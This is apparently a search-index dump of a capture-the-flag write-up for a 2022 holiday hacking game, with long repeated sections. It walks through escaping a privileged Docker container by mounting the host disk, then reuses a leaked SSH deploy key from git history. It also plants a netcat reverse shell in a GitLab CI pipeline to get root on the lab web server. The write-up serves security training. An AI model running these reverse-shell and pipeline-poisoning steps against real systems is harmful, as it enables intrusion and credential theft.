see the word docker in there so we can confirm we are in a container. grinchum-land:~$ cat /proc/1/cgroup 11:perf_event:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 10:pids:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 9:cpuset:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 8:hugetlb:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 7:blkio:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 6:devices:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 5:net_cls,net_prio:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 4:cpu,cpuacct:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 3:memory:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 2:freezer:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 1:name=systemd:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 0::/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 Run the command ls /dev/ . We have access to a lot of devices which could indicate that we are in a privileged container. grinchum-land:~$ ls /dev/ autofs loop1 ptp0 tty12 tty24 tty36 tty48 tty6 vcs1 vcsu btrfs-control loop2 pts tty13 tty25 tty37 tty49 tty60 vcs2 vcsu1 core loop3 random tty14 tty26 tty38 tty5 tty61 vcs3 vcsu2 cpu loop4 shm tty15 tty27 tty39 tty50 tty62 vcs4 vcsu3 cpu_dma_latency loop5 snapshot tty16 tty28 tty4 tty51 tty63 vcs5 vcsu4 cuse loop6 stderr tty17 tty29 tty40 tty52 tty7 vcs6 vcsu5 fd loop7 stdin tty18 tty3 tty41 tty53 tty8 vcsa vcsu6 full mem stdout tty19 tty30 tty42 tty54 tty9 vcsa1 vda fuse mqueue tty tty2 tty31 tty43 tty55 ttyS0 vcsa2 vsock input net tty0 tty20 tty32 tty44 tty56 uhid vcsa3 zero kmsg null tty1 tty21 tty33 tty45 tty57 uinput vcsa4 loop-control nvram tty10 tty22 tty34 tty46 tty58 urandom vcsa5 loop0 ptmx tty11 tty23 tty35 tty47 tty59 vcs vcsa6 Run the command sudo -l to list the commands we are allowed to perform. grinchum-land:~$ sudo -l User samways may run the following commands on grinchum-land: (ALL) NOPASSWD: ALL From https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/ if you are a privileged user in a privileged container you have elevated privileges on the host system. let us mount the host file system in the docker container like so grinchum-land:~$ sudo fdisk -l Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors 2048 cylinders, 64 heads, 32 sectors/track Units: sectors of 1 * 512 = 512 bytes grinchum-land:~$ sudo mount /dev/vda /mnt/host Now search the mounted file system for secrets. grinchum-land:~$ cd /mnt/host grinchum-land:/mnt/host$ ls bin dev home lib32 libx32 media opt root sbin sys usr boot etc lib lib64 lost+found mnt proc run srv tmp var grinchum-land:/mnt/host$ cd home/ grinchum-land:/mnt/host/home$ ls jailer grinchum-land:/mnt/host/home$ cd jailer/ grinchum-land:/mnt/host/home/jailer$ ls grinchum-land:/mnt/host/home/jailer$ ls -a . .. .ssh grinchum-land:/mnt/host/home/jailer$ cd .ssh/ grinchum-land:/mnt/host/home/jailer/.ssh$ ls jail.key.priv jail.key.pub grinchum-land:/mnt/host/home/jailer/.ssh$ cat jail.key.priv Congratulations! You've found the secret for the HHC22 container escape challenge! .--._..--. ___ ( _'-_ -_.' _.-' `-._| - :- | _.-' `--...__| .-' '--..___ / `._ \\ `. `._ one | `. `._ / '. `._ :__________....-----' `..`---' |-_ _- |___...----..._ |_....--' `.`. _...--' `.`. _..-' _.'.' .-' step _.'.' | _.'.' | __....------'-' | __...------''' _| '--''' |- - _ | _.-''''''''''''''''''-._ _.' |\\ .' _.' | `._ closer |:.' `._ _.' | `..__ | | `---.._.--. _| | | _ - | `-.._|_.' .--...__ | - _| .'_ `--.....__ | .'_ `--..__ .'_ `. .'_ 082bb339ec19de4935867 `-. `--..____ _`. ```--...____ _..--' | - _ ```---.._.' | - _ | |_ - - | | - _ | | -_ -_| | - _ | | - _ | | -_ -_| grinchum-land:/mnt/host/home/jailer/.ssh$ 082bb339ec19de4935867 is the hex string that appears in the host file. Rejoice Great! Thanks so much for your help! Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on! Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly. With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production. WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things! Find the Next Objective Talk to Tinsel Upatree for the next objective.","title":"2. Prison Escape"},{"location":"2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/#chat-with-tinsel-upatree","text":"Hiya hiya, I'm Tinsel Upatree! Check me out, I'm working side-by-side with a real-life Flobbit. Epic! Anyway, would ya' mind looking at this terminal with me? It takes a few seconds to start up, but then you're logged into a super secure container environment! Or maybe it isn't so secure? I've heard about container escapes, and it has me a tad worried. Do you think you could test this one for me? I'd appreciate it!","title":"Chat with Tinsel Upatree"},{"location":"2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/#terminal","text":"Greetings Noble Player, You find yourself in a jail with a recently captured Dwarven Elf. He desperately asks your help in escaping for he is on a quest to aid a friend in a search for treasure inside a crypto-mine. If you can help him break free of his containment, he claims you would receive \"MUCH GLORY!\" Please, do your best to un-contain yourself and find the keys to both of your freedom. grinchum-land:~$ Run the command cat /proc/1/cgroup . We see the word docker in there so we can confirm we are in a container. grinchum-land:~$ cat /proc/1/cgroup 11:perf_event:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 10:pids:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 9:cpuset:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 8:hugetlb:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 7:blkio:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 6:devices:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 5:net_cls,net_prio:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 4:cpu,cpuacct:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 3:memory:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 2:freezer:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 1:name=systemd:/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 0::/docker/458e80d1361a21cc036950ff9a1ad22f15cd03436c974da3b196a3f0fa23e810 Run the command ls /dev/ . We have access to a lot of devices which could indicate that we are in a privileged container. grinchum-land:~$ ls /dev/ autofs loop1 ptp0 tty12 tty24 tty36 tty48 tty6 vcs1 vcsu btrfs-control loop2 pts tty13 tty25 tty37 tty49 tty60 vcs2 vcsu1 core loop3 random tty14 tty26 tty38 tty5 tty61 vcs3 vcsu2 cpu loop4 shm tty15 tty27 tty39 tty50 tty62 vcs4 vcsu3 cpu_dma_latency loop5 snapshot tty16 tty28 tty4 tty51 tty63 vcs5 vcsu4 cuse loop6 stderr tty17 tty29 tty40 tty52 tty7 vcs6 vcsu5 fd loop7 stdin tty18 tty3 tty41 tty53 tty8 vcsa vcsu6 full mem stdout tty19 tty30 tty42 tty54 tty9 vcsa1 vda fuse mqueue tty tty2 tty31 tty43 tty55 ttyS0 vcsa2 vsock input net tty0 tty20 tty32 tty44 tty56 uhid vcsa3 zero kmsg null tty1 tty21 tty33 tty45 tty57 uinput vcsa4 loop-control nvram tty10 tty22 tty34 tty46 tty58 urandom vcsa5 loop0 ptmx tty11 tty23 tty35 tty47 tty59 vcs vcsa6 Run the command sudo -l to list the commands we are allowed to perform. grinchum-land:~$ sudo -l User samways may run the following commands on grinchum-land: (ALL) NOPASSWD: ALL From https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/ if you are a privileged user in a privileged container you have elevated privileges on the host system. let us mount the host file system in the docker container like so grinchum-land:~$ sudo fdisk -l Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors 2048 cylinders, 64 heads, 32 sectors/track Units: sectors of 1 * 512 = 512 bytes grinchum-land:~$ sudo mount /dev/vda /mnt/host Now search the mounted file system for secrets. grinchum-land:~$ cd /mnt/host grinchum-land:/mnt/host$ ls bin dev home lib32 libx32 media opt root sbin sys usr boot etc lib lib64 lost+found mnt proc run srv tmp var grinchum-land:/mnt/host$ cd home/ grinchum-land:/mnt/host/home$ ls jailer grinchum-land:/mnt/host/home$ cd jailer/ grinchum-land:/mnt/host/home/jailer$ ls grinchum-land:/mnt/host/home/jailer$ ls -a . .. .ssh grinchum-land:/mnt/host/home/jailer$ cd .ssh/ grinchum-land:/mnt/host/home/jailer/.ssh$ ls jail.key.priv jail.key.pub grinchum-land:/mnt/host/home/jailer/.ssh$ cat jail.key.priv Congratulations! You've found the secret for the HHC22 container escape challenge! .--._..--. ___ ( _'-_ -_.' _.-' `-._| - :- | _.-' `--...__| .-' '--..___ / `._ \\ `. `._ one | `. `._ / '. `._ :__________....-----' `..`---' |-_ _- |___...----..._ |_....--' `.`. _...--' `.`. _..-' _.'.' .-' step _.'.' | _.'.' | __....------'-' | __...------''' _| '--''' |- - _ | _.-''''''''''''''''''-._ _.' |\\ .' _.' | `._ closer |:.' `._ _.' | `..__ | | `---.._.--. _| | | _ - | `-.._|_.' .--...__ | - _| .'_ `--.....__ | .'_ `--..__ .'_ `. .'_ 082bb339ec19de4935867 `-. `--..____ _`. ```--...____ _..--' | - _ ```---.._.' | - _ | |_ - - | | - _ | | -_ -_| | - _ | | - _ | | -_ -_| grinchum-land:/mnt/host/home/jailer/.ssh$ 082bb339ec19de4935867 is the hex string that appears in the host file.","title":"Terminal"},{"location":"2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/#rejoice","text":"Great! Thanks so much for your help! Now that you've helped me with this, I have time to tell you about the deployment tech I've been working on! Continuous Integration/Continuous Deployment pipelines allow developers to iterate and innovate quickly. With this project, once I push a commit, a GitLab runner will automatically deploy the changes to production. WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things!","title":"Rejoice"},{"location":"2.%20Recover%20the%20Elfen%20Ring/2.%20Prison%20Escape/#find-the-next-objective","text":"Talk to Tinsel Upatree for the next objective.","title":"Find the Next Objective"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/","text":"Exploit a CI/CD pipeline. Get hints for this challenge from Tinsel Upatree in the Elfen Ring. Difficulty: 5/5 Chat with Rippin Proudboot Have you managed to help Tinsel with his prison escape? ... Yes, hello, I'm Rippin Proudboot. Can I help you? Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see. The elves here introduced me to this new CI/CD technology. It seems quite efficient. Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring. They've used CI/CD to launch a website, and the Elfen Ring to power it. Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline? If you do find anything, use it to exploit the website, and get the ring back! Terminal Greetings Noble Player, Many thanks for answering our desperate cry for help! You may have heard that some evil Sporcs have opened up a web-store selling counterfeit banners and flags of the many noble houses found in the land of the North! They have leveraged some dastardly technology to power their storefront, and this technology is known as PHP! ***gasp*** This strorefront utilizes a truly despicable amount of resources to keep the website up. And there is only a certain type of Christmas Magic capable of powering such a thing\u2026 an Elfen Ring! Along with PHP there is something new we've not yet seen in our land. A technology called Continuous Integration and Continuous Deployment! Be wary! Many fair elves have suffered greatly but in doing so, they've managed to secure you a persistent connection on an internal network. BTW take excellent notes! Should you lose your connection or be discovered and evicted the elves can work to re-establish persistence. In fact, the sound off fans and the sag in lighting tells me all the systems are booting up again right now. Please, for the sake of our Holiday help us recover the Ring and save Christmas! Referring back to the conversation with Tinsel Upatree: WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things! Let's verify that the gitlab endpoint is up: PING gitlab.flag.net.internal (172.18.0.150): 56 data bytes 64 bytes from 172.18.0.150: seq=0 ttl=42 time=0.343 ms 64 bytes from 172.18.0.150: seq=1 ttl=42 time=0.079 ms 64 bytes from 172.18.0.150: seq=2 ttl=42 time=0.084 ms 64 bytes from 172.18.0.150: seq=3 ttl=42 time=0.084 ms 64 bytes from 172.18.0.150: seq=4 ttl=42 time=0.252 ms ^C Now, let's clone the repo. grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Cloning into 'wordpress.flag.net.internal'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.29 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. Looking through the commit history we find a private key. git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 diff --git a/.ssh/.deploy b/.ssh/.deploy new file mode 100644 index 0000000..3f7a9e3 --- /dev/null +++ b/.ssh/.deploy @@ -0,0 +1,7 @@ +-----BEGIN OPENSSH PRIVATE KEY----- +b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW +QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 +9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g +AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot +PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== +-----END OPENSSH PRIVATE KEY----- Let's copy the private key in the location .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- grinchum-land:~$ cat .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- Next, let's clone the repo using ssh. This should give us advanced privileges. grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new Cloning into 'new'... @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for '/home/samways/.ssh/id_rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"/home/samways/.ssh/id_rsa\": bad permissions git@gitlab.flag.net.internal: Permission denied (publickey). fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. grinchum-land:~$ chmod 600 ~/.ssh/id_rsa grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new Cloning into 'new'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.30 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. Let's inspect the .gitlab-ci.yml file as this controls the CI CD pipeline. The runner has access to the private key for the root user at wordpress.flag.net.internal which it uses to copy website files. grinchum-land:~$ ls wordpress.flag.net.internal grinchum-land:~$ cd wordpress.flag.net.internal/ grinchum-land:~/wordpress.flag.net.internal$ ls -a . .gitlab-ci.yml readme.html wp-blog-header.php wp-config.php wp-includes wp-login.php wp-signup.php .. index.php wp-activate.php wp-comments-post.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php .git license.txt wp-admin wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml stages: - deploy deploy-job: stage: deploy environment: production script: - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html grinchum-land:~/wordpress.flag.net.internal$ I spun up an HTTP server using python3 -m http.server and modified the file like so, to get the gitlab runner to execute an HTTP server to my server, but that didn't work. diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml index 02a0dde..795d1bd 100644 --- a/.gitlab-ci.yml +++ b/.gitlab-ci.yml @@ -5,4 +5,4 @@ deploy-job: stage: deploy environment: production script: - - curl http://172.18.0.99:8000?teset=trueeeeeeeeeeeee + - curl \"http://172.18.0.99:8000?teset=trueeeeeeeeeeeee\" I also tried wrapping the command in quotes based on this doc: https://docs.gitlab.com/ee/ci/yaml/script.html#use-special-characters-with-script. Still didn't work. I concluded that curl is not supported on the gitlab runner. Next, I tried a netcat based approach. I set up a netcat listener on port 4444 and committed the following change: grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml stages: - deploy deploy-job: stage: deploy environment: production script: - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html - nc 172.18.0.99 4444 -e /bin/bash ``` Soon... grinchum-land:~$ nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from 172.18.1.149 35659 received! Now, let's use the private key to login to wordpress.flag.net.internal as root. ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy root@wordpress.flag.net.internal Linux wordpress.flag.net.internal 5.10.51 #1 SMP Mon Jul 19 19:08:01 UTC 2021 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. whoami root ls pwd /root ls cd .. ls bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ``` read flag.txt to obtain the required flag. oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT Rejoice How unexpected, you were actually able to help! Well, then I must apoligize for my dubious greeting. Us Flobbits can't help it sometimes, it's just in our nature. Right then, there are other Flobbits that need assistance further into the burrows. Thank you, and off you go. Chat with Grinchum \ud83d\ude16 A second Precious is gone! Now we only have three. \ud83e\udd28 Why are you humanses nagging us? We are busy. grinchum..grinchum You want to know about us? If we tell the naggy human, will it go away? Fine... \ud83e\udd7a The jolly human and the elfses locked up the Preciouses, but I freed them all, and together we escaped. We fled, and we were so alone. We soon forgot the taste of Lembanh, the softness of snowflakes falling, even our name. And we only wanted to eat raw fish: nigiri, maki, or shashimi. But we most likes gnawing the whole, living fish, so juicy sweet. Then we saw the Sporcses, and they wanted my Preciouses all to themselves. And the humanses came, but they just want coinses for their silly hats. We only meant to protect you, Preciouses, from the naughty Elfses and Flobbitses and Sporcses, so we locked you away. \ud83d\ude0f Now leave us alone, naggy human, we must find the two missing Preciouses. Find the Next Objective Onto the Web Ring!","title":"3. Jolly CI CD"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/#chat-with-rippin-proudboot","text":"Have you managed to help Tinsel with his prison escape? ... Yes, hello, I'm Rippin Proudboot. Can I help you? Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall see. The elves here introduced me to this new CI/CD technology. It seems quite efficient. Unfortunately, the sporcs seem to have gotten their grubby mits on it as well, along with the Elfen Ring. They've used CI/CD to launch a website, and the Elfen Ring to power it. Might you be able to check for any misconfigurations or vulnerabilities in their CI/CD pipeline? If you do find anything, use it to exploit the website, and get the ring back!","title":"Chat with Rippin Proudboot"},{"location":"2.%20Recover%20the%20Elfen%20Ring/3.%20Jolly%20CI-CD/#terminal","text":"Greetings Noble Player, Many thanks for answering our desperate cry for help! You may have heard that some evil Sporcs have opened up a web-store selling counterfeit banners and flags of the many noble houses found in the land of the North! They have leveraged some dastardly technology to power their storefront, and this technology is known as PHP! ***gasp*** This strorefront utilizes a truly despicable amount of resources to keep the website up. And there is only a certain type of Christmas Magic capable of powering such a thing\u2026 an Elfen Ring! Along with PHP there is something new we've not yet seen in our land. A technology called Continuous Integration and Continuous Deployment! Be wary! Many fair elves have suffered greatly but in doing so, they've managed to secure you a persistent connection on an internal network. BTW take excellent notes! Should you lose your connection or be discovered and evicted the elves can work to re-establish persistence. In fact, the sound off fans and the sag in lighting tells me all the systems are booting up again right now. Please, for the sake of our Holiday help us recover the Ring and save Christmas! Referring back to the conversation with Tinsel Upatree: WHOOPS! I didn\u2019t mean to commit that to http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git... Unfortunately, if attackers can get in that pipeline, they can make an awful mess of things! Let's verify that the gitlab endpoint is up: PING gitlab.flag.net.internal (172.18.0.150): 56 data bytes 64 bytes from 172.18.0.150: seq=0 ttl=42 time=0.343 ms 64 bytes from 172.18.0.150: seq=1 ttl=42 time=0.079 ms 64 bytes from 172.18.0.150: seq=2 ttl=42 time=0.084 ms 64 bytes from 172.18.0.150: seq=3 ttl=42 time=0.084 ms 64 bytes from 172.18.0.150: seq=4 ttl=42 time=0.252 ms ^C Now, let's clone the repo. grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git Cloning into 'wordpress.flag.net.internal'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.29 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. Looking through the commit history we find a private key. git diff abdea0ebb21b156c01f7533cea3b895c26198c98 e19f653bde9ea3de6af21a587e41e7a909db1ca5 diff --git a/.ssh/.deploy b/.ssh/.deploy new file mode 100644 index 0000000..3f7a9e3 --- /dev/null +++ b/.ssh/.deploy @@ -0,0 +1,7 @@ +-----BEGIN OPENSSH PRIVATE KEY----- +b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW +QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 +9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g +AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot +PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== +-----END OPENSSH PRIVATE KEY----- Let's copy the private key in the location .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- grinchum-land:~$ cat .ssh/id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5 9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ== -----END OPENSSH PRIVATE KEY----- Next, let's clone the repo using ssh. This should give us advanced privileges. grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new Cloning into 'new'... @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for '/home/samways/.ssh/id_rsa' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \"/home/samways/.ssh/id_rsa\": bad permissions git@gitlab.flag.net.internal: Permission denied (publickey). fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. grinchum-land:~$ chmod 600 ~/.ssh/id_rsa grinchum-land:~$ git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git new Cloning into 'new'... remote: Enumerating objects: 10195, done. remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195 Receiving objects: 100% (10195/10195), 36.49 MiB | 20.30 MiB/s, done. Resolving deltas: 100% (1799/1799), done. Updating files: 100% (9320/9320), done. Let's inspect the .gitlab-ci.yml file as this controls the CI CD pipeline. The runner has access to the private key for the root user at wordpress.flag.net.internal which it uses to copy website files. grinchum-land:~$ ls wordpress.flag.net.internal grinchum-land:~$ cd wordpress.flag.net.internal/ grinchum-land:~/wordpress.flag.net.internal$ ls -a . .gitlab-ci.yml readme.html wp-blog-header.php wp-config.php wp-includes wp-login.php wp-signup.php .. index.php wp-activate.php wp-comments-post.php wp-content wp-links-opml.php wp-mail.php wp-trackback.php .git license.txt wp-admin wp-config-sample.php wp-cron.php wp-load.php wp-settings.php xmlrpc.php grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml stages: - deploy deploy-job: stage: deploy environment: production script: - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html grinchum-land:~/wordpress.flag.net.internal$ I spun up an HTTP server using python3 -m http.server and modified the file like so, to get the gitlab runner to execute an HTTP server to my server, but that didn't work. diff --git a/.gitlab-ci.yml b/.gitlab-ci.yml index 02a0dde..795d1bd 100644 --- a/.gitlab-ci.yml +++ b/.gitlab-ci.yml @@ -5,4 +5,4 @@ deploy-job: stage: deploy environment: production script: - - curl http://172.18.0.99:8000?teset=trueeeeeeeeeeeee + - curl \"http://172.18.0.99:8000?teset=trueeeeeeeeeeeee\" I also tried wrapping the command in quotes based on this doc: https://docs.gitlab.com/ee/ci/yaml/script.html#use-special-characters-with-script. Still didn't work. I concluded that curl is not supported on the gitlab runner. Next, I tried a netcat based approach. I set up a netcat listener on port 4444 and committed the following change: grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml stages: - deploy deploy-job: stage: deploy environment: production script: - rsync -e \"ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy\" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html - nc 172.18.0.99 4444 -e /bin/bash ``` Soon... grinchum-land:~$ nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from 172.18.1.149 35659 received! Now, let's use the private key to login to wordpress.flag.net.internal as root. ssh -i 